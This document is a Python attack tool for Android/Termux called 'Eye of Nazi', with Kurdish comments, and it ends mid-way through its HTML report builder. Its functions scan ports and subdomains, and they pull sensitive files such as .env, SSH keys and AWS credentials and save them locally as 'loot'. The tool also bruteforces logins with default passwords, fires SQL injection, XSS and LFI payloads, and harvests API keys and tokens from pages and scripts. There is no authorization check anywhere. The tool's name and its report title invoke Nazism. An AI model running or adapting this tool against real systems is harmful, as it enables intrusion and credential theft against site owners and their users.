# language: Python, file: eye_of_nazi.py, target: Android/Termux
# ═══════════════════════════════════════════════════════════════════
#                    E Y E   O F   N A Z I   v2.0
#           20 Advanced Features · HTML Report · Termux Ready
# ═══════════════════════════════════════════════════════════════════
# پێویست: pkg install python && pip install requests beautifulsoup4 dnspython

import os, sys, re, json, time, socket, ssl, ftplib, hashlib, hmac
import urllib.request, urllib.parse, subprocess, random, threading
import base64, ipaddress, concurrent.futures
from datetime import datetime
from collections import defaultdict

try:
    import requests
    from bs4 import BeautifulSoup
    import dns.resolver
except ImportError:
    print("[!] pip install requests beautifulsoup4 dnspython")
    sys.exit(1)

# ─── CONFIG ───────────────────────────────────────────────────────
VERSION = "2.0"
LOGFILE = "eye_of_nazi_log.txt"
REPORT_FILE = "eye_of_nazi_report.html"
THREADS = 200
TIMEOUT = 5.0

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
]

def ua():
    return {"User-Agent": random.choice(USER_AGENTS)}

# ─── COLORS ───────────────────────────────────────────────────────
class C:
    R="\033[91m"; G="\033[92m"; Y="\033[93m"; B="\033[94m"
    M="\033[95m"; C="\033[96m"; W="\033[97m"; RESET="\033[0m"; BOLD="\033[1m"

# ─── FINDINGS ─────────────────────────────────────────────────────
FINDINGS = []

def add_finding(sev, title, detail=""):
    FINDINGS.append({"severity": sev, "title": title, "detail": detail})
    color = {"CRITICAL": C.R, "HIGH": C.M, "MEDIUM": C.Y, "LOW": C.C, "INFO": C.W}.get(sev, C.W)
    print(f"{color}[{sev}] {title} — {str(detail)[:100]}{C.RESET}")

# ─── LOGGER ───────────────────────────────────────────────────────
class Logger:
    def __init__(self, path):
        self.path = path
        self.lock = threading.Lock()
    def log(self, msg, level="INFO"):
        stamp = datetime.now().strftime("%H:%M:%S")
        colors = {"INFO": C.C, "OK": C.G, "WARN": C.Y, "ERR": C.R, "HIT": C.M}
        col = colors.get(level, C.W)
        line = f"[{stamp}] [{level}] {msg}"
        with self.lock:
            print(f"{col}{line}{C.RESET}")
            with open(self.path, "a", encoding="utf-8") as f:
                f.write(line + "\n")

LOG = Logger(LOGFILE)

# ─── LOGO (لەناو کۆدەکەدا) ────────────────────────────────────────
LOGO = r"""
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣄⣤⣤⣤⣤⣤⣤⣤⣤⣤⠄
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢴⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣴⡴
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢺⣾⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⢿⡖
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣰⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣋⣀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⣀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢨⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⣿⣿⣯⣿⣿⣿⣿⣿⣿⢹⡿⢿⣿⣿⣿⣿⣿⣷⡦
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣺⣿⣿⣿⣿⠷⠀⠀⠀⠀⠀⠀⢿⣿⡇⠀⠀⢸⣿⡿⠿⠀⠈⠀⠀⠁⠖⡿⣿⣿⣿⣇⡀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⡟⠿⠀⠀⠀⠀⠀⠀⠀⠀⣿⣧⠀⠀⠘⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠿⣿⣿⣿⣏⣤
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⣦⣿⣛⡀⠀⠀⢻⣷⡆⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⡟⠛
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⡇⠀⠀⠀⠀⠀⠠⣶⣶⣿⡿⠆⠀⠀⠀⢨⣿⣷⣇⠀⢀⠀⠀⠀⠀⠀⣿⣿⣿⡯⠅
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣇⣀⣐⣤⣾⣿⣿⣿⣿⣿⢀⠀⠀⣀⠀⠀⢸⣿⣿⣿⣿⣾⣿⣣⣀⣀⣿⣿⣿⣷⡖
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣌⣤⣤⣿⣤⣴⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⡀
⠀⠀⠀⠀⠀⠀⠀⠀⣉⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄
⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣟⠭⠽⠋⠉⠩⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢫⠉⠉⡍⠭⠹⣿⣿⡏⡅
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣷⣀⣀⠀⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠈⠀⣀⣀⣀⣿⣿⣿⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣿⣿⣿⣿⡇⠀⠀⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⠆⠀⠀⣿⣿⣿⣿⣿⡿⠇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢻⣿⣿⣿⣿⣇⡄⢀⣿⣿⣿⣿⣿⣿⣿⡟⣻⡟⢻⣿⣿⣿⣿⣿⣭⣄⣤⣿⣿⣿⣿⣿⡃
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣧⠨⣿⣿⣿⣿⠍⠉⠙⠉⠉⠉⠉⠉⢹⣿⣿⣿⠩⠅⣺⣿⣿⣿⣿⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⢿⣿⣿⣿⣿⣿⣿⣿⣿⠇⠁⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⢸⣿⢿⡇⣽⣿⣿⣿⡿⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⣿⣿⡆⠀⠻⠓⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⠃⠀⣿⣿⣿⠶⠛
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣼⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣤⡀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣾⣿⣿⣣⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢦⣿⣿⣿⡎⠁
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⢿⣿⣿⣿⣴⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡰⣿⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⢼⣿⣿⣿⣿⣒⣶⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣲⣿⣿⣿⣿⣿⠶
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢻⣿⣿⣿⣿⣿⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⣿⣿⣿⡟
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣹⣿⣿⣿⣿⣿⣤⡄⠰⡤⣤⣤⡀⡄⠀⢰⣼⣿⣿⣿⣿⢿⡝
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡋
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠒⢛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣯⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠈⠋
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠿⠿⠿⠿⠿⠿⠿⠿⠇
"""

def load_logo():
    return LOGO

# ─── HELPERS ──────────────────────────────────────────────────────
def safe_get(url, **kw):
    try:
        kw.setdefault("timeout", TIMEOUT)
        kw.setdefault("headers", ua())
        return requests.get(url, **kw)
    except Exception:
        return None

def safe_post(url, **kw):
    try:
        kw.setdefault("timeout", TIMEOUT)
        kw.setdefault("headers", ua())
        return requests.post(url, **kw)
    except Exception:
        return None

def norm_target(target):
    if target.startswith("http"):
        base = target.rstrip("/")
        host = target.split("//")[1].split("/")[0].split(":")[0]
    else:
        host = target.split("/")[0].split(":")[0]
        base = f"http://{host}"
    return base, host

def path_to_safe(url):
    return re.sub(r"[^a-zA-Z0-9._-]", "_", url.split("//")[-1])[:80]# ═══════════════════════════════════════════════════════════════════
# FEATURE 1 — SUBDOMAIN ENUM (crt.sh + DNS bruteforce)
# ═══════════════════════════════════════════════════════════════════
def feat_subdomains(host):
    LOG.log(f"[1] Subdomain Enum: {host}", "INFO")
    subs = set()
    try:
        r = requests.get(f"https://crt.sh/?q=%25.{host}&output=json", timeout=15)
        for e in r.json():
            for n in e.get("name_value","").split("\n"):
                if n.endswith(host) and "*" not in n:
                    subs.add(n.strip())
    except Exception as e:
        LOG.log(f"    crt.sh نەکرا: {e}", "WARN")
    common = ["www","mail","api","dev","test","admin","blog","shop","cdn",
              "static","app","portal","vpn","ftp","smtp","ns1","ns2","webmail"]
    for sub in common:
        fqdn = f"{sub}.{host}"
        try:
            socket.gethostbyname(fqdn)
            subs.add(fqdn)
        except Exception:
            pass
    for s in sorted(subs)[:80]:
        LOG.log(f"    {s}", "OK")
    return list(subs)

# ═══════════════════════════════════════════════════════════════════
# FEATURE 2 — PORT SCAN
# ═══════════════════════════════════════════════════════════════════
def feat_ports(host, ports=range(1, 1025)):
    LOG.log(f"[2] Port Scan: {host}", "INFO")
    open_ports = []
    def check(p):
        try:
            with socket.create_connection((host, p), timeout=1.0):
                return p
        except Exception:
            return None
    with concurrent.futures.ThreadPoolExecutor(max_workers=THREADS) as ex:
        for r in ex.map(check, ports):
            if r:
                open_ports.append(r)
                try:
                    svc = socket.getservbyport(r)
                except Exception:
                    svc = "?"
                LOG.log(f"    پۆرتی {r} ({svc})", "OK")
    return open_ports

# ═══════════════════════════════════════════════════════════════════
# FEATURE 3 — BANNER GRAB
# ═══════════════════════════════════════════════════════════════════
def feat_banner(host, port):
    try:
        s = socket.socket(); s.settimeout(3)
        s.connect((host, port))
        s.send(b"\r\n")
        data = s.recv(1024).decode(errors="ignore").strip()
        s.close()
        if data:
            LOG.log(f"    [{port}] {data[:120]}", "OK")
            return data
    except Exception:
        pass
    return None

# ═══════════════════════════════════════════════════════════════════
# FEATURE 4 — HTTP HEADERS + SECURITY HEADERS
# ═══════════════════════════════════════════════════════════════════
def feat_headers(base_url):
    LOG.log(f"[4] HTTP Headers: {base_url}", "INFO")
    r = safe_get(base_url)
    if not r: return
    sec = {
        "Strict-Transport-Security": "HSTS",
        "Content-Security-Policy": "CSP",
        "X-Frame-Options": "Clickjacking",
        "X-Content-Type-Options": "MIME sniffing",
        "Referrer-Policy": "Referrer leak",
        "Permissions-Policy": "Feature policy",
    }
    for h, name in sec.items():
        if h in r.headers:
            LOG.log(f"    [+] {h}: {r.headers[h][:80]}", "OK")
        else:
            add_finding("LOW", f"Header کەم: {h}", name)
    LOG.log(f"    Server: {r.headers.get('Server','?')}", "OK")
    LOG.log(f"    X-Powered-By: {r.headers.get('X-Powered-By','?')}", "OK")

# ═══════════════════════════════════════════════════════════════════
# FEATURE 5 — SSL/TLS ANALYSIS
# ═══════════════════════════════════════════════════════════════════
def feat_ssl(host):
    LOG.log(f"[5] SSL/TLS: {host}", "INFO")
    try:
        ctx = ssl.create_default_context()
        with ctx.wrap_socket(socket.socket(), server_hostname=host) as s:
            s.settimeout(5); s.connect((host, 443))
            cert = s.getpeercert()
            LOG.log(f"    Subject: {dict(x[0] for x in cert.get('subject',[]))}", "OK")
            LOG.log(f"    Issuer: {dict(x[0] for x in cert.get('issuer',[]))}", "OK")
            LOG.log(f"    Expires: {cert.get('notAfter')}", "OK")
            LOG.log(f"    TLS: {s.version()}", "OK")
    except Exception as e:
        LOG.log(f"    نەکرا: {e}", "WARN")

# ═══════════════════════════════════════════════════════════════════
# FEATURE 6 — DNS RECON
# ═══════════════════════════════════════════════════════════════════
def feat_dns(host):
    LOG.log(f"[6] DNS: {host}", "INFO")
    for rtype in ["A","AAAA","MX","NS","TXT","CNAME","SOA"]:
        try:
            ans = dns.resolver.resolve(host, rtype, lifetime=5)
            for a in ans:
                LOG.log(f"    {rtype}: {a}", "OK")
        except Exception:
            pass

# ═══════════════════════════════════════════════════════════════════
# FEATURE 7 — WHOIS
# ═══════════════════════════════════════════════════════════════════
def feat_whois(host):
    LOG.log(f"[7] WHOIS: {host}", "INFO")
    try:
        out = subprocess.check_output(["whois", host], timeout=10,
                                       stderr=subprocess.DEVNULL).decode(errors="ignore")
        for line in out.splitlines():
            if any(k in line.lower() for k in
                   ["registrar:","creation","expiry","name server","org:","country"]):
                LOG.log(f"    {line.strip()[:120]}", "OK")
    except Exception as e:
        LOG.log(f"    WHOIS نەکرا: {e}", "WARN")

# ═══════════════════════════════════════════════════════════════════
# FEATURE 8 — SENSITIVE FILES
# ═══════════════════════════════════════════════════════════════════
SENSITIVE_FILES = [
    "/.env","/.env.local","/.env.production","/.git/config","/.git/HEAD",
    "/config.php","/wp-config.php","/configuration.php","/settings.py",
    "/backup.zip","/backup.tar.gz","/backup.sql","/db.sql","/dump.sql",
    "/database.sql","/phpinfo.php","/info.php","/test.php",
    "/.htaccess","/.htpasswd","/web.config","/composer.json","/package.json",
    "/.aws/credentials","/.ssh/id_rsa","/id_rsa","/.DS_Store",
    "/swagger.json","/openapi.json","/api-docs","/graphql",
    "/server-status","/.well-known/security.txt","/crossdomain.xml",
    "/readme.html","/readme.md","/CHANGELOG.md","/LICENSE","/robots.txt",
]

def feat_files(base_url):
    LOG.log(f"[8] Sensitive Files: {base_url}", "INFO")
    def check(path):
        url = base_url.rstrip("/") + path
        try:
            r = requests.get(url, timeout=4, allow_redirects=False, headers=ua())
            if r.status_code == 200 and len(r.content) > 0:
                return (path, url, 200, r.content)
            if r.status_code in (401,403):
                return (path, url, r.status_code, b"")
        except Exception:
            pass
        return None
    with concurrent.futures.ThreadPoolExecutor(max_workers=100) as ex:
        for res in ex.map(check, SENSITIVE_FILES):
            if not res: continue
            path, url, code, content = res
            if code == 200:
                add_finding("HIGH", f"فایلی هەستیار: {url}", f"{len(content)} بایت")
                safe = path_to_safe(url)
                with open(f"loot_{safe}", "wb") as f:
                    f.write(content)
            else:
                LOG.log(f"    [~] {url} ({code})", "WARN")

# ═══════════════════════════════════════════════════════════════════
# FEATURE 9 — DIRECTORY BRUTEFORCE
# ═══════════════════════════════════════════════════════════════════
COMMON_DIRS = [
    "admin","login","wp-admin","wp-content","wp-includes","backup","backups",
    "config","api","v1","v2","test","dev","staging","private","secret",
    "hidden","db","database","sql","logs","tmp","temp","cache","uploads",
    "files","images","assets","static","public","includes","inc","src",
    "lib","vendor",".git",".env",".svn","phpmyadmin","adminer","console",
    "shell","cmd","cgi-bin","server-status","server-info","dashboard",
    "panel","cpanel","webmail","mail","ftp","ssh","old","new","bak",
]

def feat_dirs(base_url):
    LOG.log(f"[9] Directory Bruteforce: {base_url}", "INFO")
    def check(d):
        url = f"{base_url.rstrip('/')}/{d}"
        try:
            r = requests.get(url, timeout=4, allow_redirects=False, headers=ua())
            if r.status_code in (200,301,302,401,403):
                return (url, r.status_code, len(r.content))
        except Exception:
            pass
        return None
    with concurrent.futures.ThreadPoolExecutor(max_workers=100) as ex:
        for res in ex.map(check, COMMON_DIRS):
            if res:
                sev = "HIGH" if res[1] == 200 else "LOW"
                add_finding(sev, f"Directory: {res[0]}", f"HTTP {res[1]}")

# ═══════════════════════════════════════════════════════════════════
# FEATURE 10 — LOGIN BRUTEFORCE
# ═══════════════════════════════════════════════════════════════════
COMMON_CREDS = [
    ("admin","admin"),("admin","password"),("admin","123456"),
    ("admin","admin123"),("admin","root"),("root","root"),
    ("root","toor"),("root","password"),("user","user"),
    ("test","test"),("guest","guest"),("administrator","administrator"),
    ("admin","12345678"),("admin","qwerty"),("admin","letmein"),
]

def feat_login(base_url):
    LOG.log(f"[10] Login Bruteforce: {base_url}", "INFO")
    login_paths = ["/login","/admin","/wp-login.php","/api/login","/auth","/signin"]
    for lp in login_paths:
        url = base_url.rstrip("/") + lp
        r = safe_get(url)
        if not r or r.status_code != 200:
            continue
        if not any(k in r.text.lower() for k in ["login","password","username"]):
            continue
        LOG.log(f"    [+] لاپەڕەی چوونەژوورەوە: {url}", "OK")
        for u, p in COMMON_CREDS:
            rr = safe_post(url, data={
                "username":u,"password":p,"user":u,"pass":p,"email":u,"login":u
            }, allow_redirects=True)
            if rr and rr.status_code == 200 and any(
                k in rr.text.lower() for k in ["logout","dashboard","welcome","profile"]):
                add_finding("CRITICAL", f"چوونەژوورەوە: {u}:{p}", url)
                return# ═══════════════════════════════════════════════════════════════════
# FEATURE 11 — SQL INJECTION
# ═══════════════════════════════════════════════════════════════════
SQLI_PAYLOADS = [
    "'", "\"", "' OR '1'='1", "' OR 1=1--", "\" OR \"1\"=\"1",
    "' UNION SELECT NULL--", "1' AND SLEEP(5)--", "1' AND 1=1--",
]
SQL_ERRORS = ["sql syntax","mysql_fetch","ora-","postgresql","sqlite",
              "unclosed quotation","you have an error in your sql",
              "warning: mysql","mysqli","pg_query","sqlstate"]

def feat_sqli(base_url):
    LOG.log(f"[11] SQL Injection: {base_url}", "INFO")
    params = ["id","page","user","username","q","search","cat","product","item","news"]
    for p in params:
        for payload in SQLI_PAYLOADS:
            url = f"{base_url}?{p}={urllib.parse.quote(payload)}"
            t0 = time.time()
            r = safe_get(url)
            if not r: continue
            elapsed = time.time() - t0
            if any(e in r.text.lower() for e in SQL_ERRORS):
                add_finding("CRITICAL", f"SQLi (error): {p}", url)
                break
            if elapsed > 4.5 and "SLEEP" in payload:
                add_finding("CRITICAL", f"SQLi (time): {p}", url)

# ═══════════════════════════════════════════════════════════════════
# FEATURE 12 — XSS SCAN
# ═══════════════════════════════════════════════════════════════════
XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "\"><script>alert(1)</script>",
    "'><img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "javascript:alert(1)",
]

def feat_xss(base_url):
    LOG.log(f"[12] XSS Scan: {base_url}", "INFO")
    params = ["q","search","name","message","comment","id","page"]
    for p in params:
        for payload in XSS_PAYLOADS:
            url = f"{base_url}?{p}={urllib.parse.quote(payload)}"
            r = safe_get(url)
            if r and payload in r.text:
                add_finding("HIGH", f"XSS reflected: {p}", url)
                break

# ═══════════════════════════════════════════════════════════════════
# FEATURE 13 — LFI SCAN
# ═══════════════════════════════════════════════════════════════════
LFI_PAYLOADS = [
    "../../../../etc/passwd",
    "....//....//....//etc/passwd",
    "..%2f..%2f..%2fetc%2fpasswd",
    "/etc/passwd",
    "C:\\Windows\\win.ini",
    "php://filter/convert.base64-encode/resource=index.php",
]

def feat_lfi(base_url):
    LOG.log(f"[13] LFI Scan: {base_url}", "INFO")
    params = ["file","page","include","path","doc","view","load"]
    for p in params:
        for payload in LFI_PAYLOADS:
            url = f"{base_url}?{p}={urllib.parse.quote(payload)}"
            r = safe_get(url)
            if r and ("root:x:" in r.text or "[extensions]" in r.text):
                add_finding("CRITICAL", f"LFI: {p}", url)
                break

# ═══════════════════════════════════════════════════════════════════
# FEATURE 14 — OPEN REDIRECT
# ═══════════════════════════════════════════════════════════════════
def feat_open_redirect(base_url):
    LOG.log(f"[14] Open Redirect: {base_url}", "INFO")
    params = ["url","redirect","next","return","goto","target","redir"]
    test = "https://example.com"
    for p in params:
        url = f"{base_url}?{p}={urllib.parse.quote(test)}"
        r = safe_get(url, allow_redirects=False)
        if r and r.status_code in (301,302) and test in r.headers.get("Location",""):
            add_finding("MEDIUM", f"Open Redirect: {p}", url)

# ═══════════════════════════════════════════════════════════════════
# FEATURE 15 — CORS MISCONFIG
# ═══════════════════════════════════════════════════════════════════
def feat_cors(base_url):
    LOG.log(f"[15] CORS: {base_url}", "INFO")
    r = safe_get(base_url, headers={"Origin":"https://evil.com","User-Agent":random.choice(USER_AGENTS)})
    if not r: return
    acao = r.headers.get("Access-Control-Allow-Origin","")
    acac = r.headers.get("Access-Control-Allow-Credentials","")
    if acao == "*" or "evil.com" in acao:
        add_finding("HIGH", "CORS misconfig", f"ACAO={acao} ACAC={acac}")

# ═══════════════════════════════════════════════════════════════════
# FEATURE 16 — WAF DETECTION
# ═══════════════════════════════════════════════════════════════════
WAFS = {
    "Cloudflare": ["cloudflare","cf-ray"],
    "AWS WAF": ["awselb","x-amz"],
    "Sucuri": ["sucuri","x-sucuri"],
    "Akamai": ["akamai","x-akamai"],
    "Imperva": ["imperva","incap_ses"],
    "F5 BIG-IP": ["bigip","x-wa-info"],
    "ModSecurity": ["mod_security","modsecurity"],
    "Wordfence": ["wordfence"],
}

def feat_waf(base_url):
    LOG.log(f"[16] WAF Detect: {base_url}", "INFO")
    r = safe_get(base_url + "/?test=<script>alert(1)</script>")
    if not r: return
    text = r.text.lower()
    headers = str(r.headers).lower()
    for waf, markers in WAFS.items():
        if any(m in text or m in headers for m in markers):
            LOG.log(f"    [+] WAF: {waf}", "OK")

# ═══════════════════════════════════════════════════════════════════
# FEATURE 17 — TECH FINGERPRINT
# ═══════════════════════════════════════════════════════════════════
TECH_SIGS = {
    "WordPress": ["wp-content","wp-includes","wordpress"],
    "Drupal": ["drupal","sites/default"],
    "Joomla": ["joomla","com_content"],
    "Laravel": ["laravel","csrf-token"],
    "Django": ["django","csrfmiddlewaretoken"],
    "React": ["react","_react"],
    "Vue": ["vue.js","__vue__"],
    "Angular": ["ng-","angular"],
    "jQuery": ["jquery"],
    "Bootstrap": ["bootstrap"],
    "Nginx": ["nginx"],
    "Apache": ["apache"],
    "Cloudflare": ["cloudflare"],
    "PHP": ["php"],
    "ASP.NET": ["asp.net","__viewstate"],
}

def feat_tech(base_url):
    LOG.log(f"[17] Tech Fingerprint: {base_url}", "INFO")
    r = safe_get(base_url)
    if not r: return
    text = r.text.lower()
    server = r.headers.get("Server","").lower()
    for tech, markers in TECH_SIGS.items():
        if any(m in text or m in server for m in markers):
            LOG.log(f"    [+] {tech}", "OK")

# ═══════════════════════════════════════════════════════════════════
# FEATURE 18 — EMAIL + LINK + FORM EXTRACT
# ═══════════════════════════════════════════════════════════════════
def feat_extract(base_url):
    LOG.log(f"[18] Extract (emails/links/forms): {base_url}", "INFO")
    r = safe_get(base_url)
    if not r: return
    emails = set(re.findall(r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}", r.text))
    for e in list(emails)[:20]:
        LOG.log(f"    email: {e}", "OK")
    soup = BeautifulSoup(r.text, "html.parser")
    for a in list(soup.find_all("a", href=True))[:20]:
        LOG.log(f"    link: {a['href'][:80]}", "INFO")
    for i, form in enumerate(soup.find_all("form")):
        action = form.get("action","")
        method = form.get("method","GET").upper()
        inputs = [inp.get("name") for inp in form.find_all(["input","textarea"]) if inp.get("name")]
        LOG.log(f"    form{i}: {method} {action} — {inputs}", "OK")

# ═══════════════════════════════════════════════════════════════════
# FEATURE 19 — SECRETS SCAN
# ═══════════════════════════════════════════════════════════════════
SECRET_PATTERNS = {
    "AWS Key": r"AKIA[0-9A-Z]{16}",
    "Google API": r"AIza[0-9A-Za-z\-_]{35}",
    "Stripe": r"sk_live_[0-9a-zA-Z]{24}",
    "GitHub Token": r"ghp_[0-9a-zA-Z]{36}",
    "Slack": r"xox[baprs]-[0-9a-zA-Z\-]+",
    "Private Key": r"-----BEGIN (RSA |EC )?PRIVATE KEY-----",
    "JWT": r"eyJ[A-Za-z0-9_\-]+\.eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+",
}

def feat_secrets(base_url):
    LOG.log(f"[19] Secrets Scan: {base_url}", "INFO")
    r = safe_get(base_url)
    if not r: return
    for name, pat in SECRET_PATTERNS.items():
        for m in re.findall(pat, r.text, re.IGNORECASE):
            add_finding("HIGH", f"{name} لە HTML", str(m)[:60])

# ═══════════════════════════════════════════════════════════════════
# FEATURE 20 — JS ANALYSIS (endpoints + secrets)
# ═══════════════════════════════════════════════════════════════════
def feat_js(base_url):
    LOG.log(f"[20] JS Analysis: {base_url}", "INFO")
    r = safe_get(base_url)
    if not r: return
    soup = BeautifulSoup(r.text, "html.parser")
    js_urls = [s["src"] for s in soup.find_all("script", src=True)]
    for js in js_urls[:20]:
        if js.startswith("//"): js = "https:" + js
        elif js.startswith("/"): js = base_url.rstrip("/") + js
        rr = safe_get(js)
        if not rr: continue
        for name, pat in SECRET_PATTERNS.items():
            for m in re.findall(pat, rr.text, re.IGNORECASE):
                add_finding("HIGH", f"{name} لە JS: {js}", str(m)[:60])
        for m in set(re.findall(r'["\'](/api/[^"\']+)["\']', rr.text)):
            LOG.log(f"    API لە JS: {m}", "OK")# ═══════════════════════════════════════════════════════════════════
# HTML REPORT BUILDER
# ═══════════════════════════════════════════════════════════════════
def build_report(target, duration):
    counts = defaultdict(int)
    for f in FINDINGS:
        counts[f["severity"]] += 1

    rows = ""
    for f in FINDINGS:
        sev = f["severity"]
        color = {"CRITICAL":"#c0392b","HIGH":"#e67e22","MEDIUM":"#f1c40f",
                 "LOW":"#3498db","INFO":"#888"}.get(sev,"#888")
        rows += f"""
        <tr>
            <td style="background:{color};color:#fff;font-weight:bold">{sev}</td>
            <td>{f['title']}</td>
            <td style="font-family:monospace;font-size:12px">{f['detail']}</td>
        </tr>"""

    html = f"""<!DOCTYPE html>
<html lang="ku">
<head>
<meta charset="utf-8">
<title>EYE OF NAZI — {target}</title>
<style>
body{{background:#0d0d0d;color:#e0e0e0;font-family:Arial,sans-serif;padding:20px}}
h1{{color:#c0392b;text-align:center;font-size:32px;letter-spacing:8px}}
h2{{color:#e67e22;border-bottom:1px solid #333;padding-bottom:5px}}
.summary{{display:flex;gap:20px;flex-wrap:wrap;margin:20px 0}}
.card{{padding:15px 25px;border-radius:8px;background:#1a1a1a;min-width:120px;text-align:center}}
.card b{{display:block;font-size:28px;margin-bottom:5px}}
.CRITICAL{{color:#c0392b}} .HIGH{{color:#e67e22}} .MEDIUM{{color:#f1c40f}}
.LOW{{color:#3498db}} .INFO{{color:#888}}
table{{width:100%;border-collapse:collapse;margin-top:20px}}
th,td{{padding:10px;border:1px solid #333;text-align:left;vertical-align:top}}
th{{background:#1a1a1a;color:#e67e22}}
tr:hover{{background:#151515}}
.meta{{text-align:center;color:#666;font-size:12px;margin-top:30px}}
pre{{background:#111;padding:10px;border-radius:5px;overflow:auto;font-size:11px;color:#0f0}}
</style>
</head>
<body>
<h1>EYE OF NAZI</h1>
<p style="text-align:center;color:#888">Scan report for <b style="color:#e67e22">{target}</b></p>

<div class="summary">
    <div class="card"><b class="CRITICAL">{counts['CRITICAL']}</b>CRITICAL</div>
    <div class="card"><b class="HIGH">{counts['HIGH']}</b>HIGH</div>
    <div class="card"><b class="MEDIUM">{counts['MEDIUM']}</b>MEDIUM</div>
